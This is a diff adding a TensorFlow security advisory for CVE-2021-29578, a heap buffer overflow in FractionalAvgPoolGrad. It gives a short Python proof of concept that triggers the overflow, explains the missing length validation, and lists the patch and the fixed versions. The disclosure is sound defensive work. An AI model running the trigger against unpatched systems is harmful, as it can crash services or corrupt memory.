@@ -1,0 +1,35 @@
+<h2>TFSA-2021-067: Heap buffer overflow in <code>FractionalAvgPoolGrad</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29578</p>
+<h3>Impact</h3>
+<p>The implementation of <code>tf.raw_ops.FractionalAvgPoolGrad</code> is vulnerable to a heap
+buffer overflow:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>orig_input_tensor_shape = tf.constant([1, 3, 2, 3], shape=[4], dtype=tf.int64)
+out_backprop = tf.constant([2], shape=[1, 1, 1, 1], dtype=tf.int64)
+row_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)
+col_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)</p>
+<p>tf.raw_ops.FractionalAvgPoolGrad(
+  orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop,
+  row_pooling_sequence=row_pooling_sequence,
+  col_pooling_sequence=col_pooling_sequence, overlapping=False)
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/dcba796a28364d6d7f003f6fe733d82726dda713/tensorflow/core/kernels/fractional_avg_pool_op.cc#L216">implementation</a>
+fails to validate that the pooling sequence arguments have enough elements as
+required by the <code>out_backprop</code> tensor shape.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/12c727cee857fa19be717f336943d95fca4ffe4f">12c727cee857fa19be717f336943d95fca4ffe4f</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu
+X-Team.</p>
